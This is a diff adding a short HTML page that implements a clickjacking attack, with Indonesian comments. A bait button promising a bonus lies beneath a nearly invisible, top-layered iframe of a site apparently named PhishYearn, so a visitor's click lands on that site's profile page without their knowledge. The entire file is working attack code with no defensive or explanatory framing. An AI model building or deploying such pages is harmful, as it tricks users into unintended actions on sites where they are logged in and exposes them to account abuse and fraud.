@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    .container {
+      position: relative;
+      width: 600px;
+      height: 400px;
+    }
+    /* Lapisan Bawah: Umpan */
+    .decoy-btn {
+      position: absolute;
+      top: 150px;
+      left: 180px;
+      padding: 15px 30px;
+      background: #e11d48;
+      color: white;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+    }
+    /* Lapisan Atas: Web PhishYearn yang dibuat tembus pandang */
+    .victim-iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0.0001; /* Tidak kelihatan oleh mata */
+      z-index: 999;    /* Berada di posisi paling atas */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <button class="decoy-btn">KLAIM BONUS KAMU!</button>
+    <iframe src="https://phishyearn.my.id/profil" class="victim-iframe"></iframe>
+  </div>
+</body>
+</html>
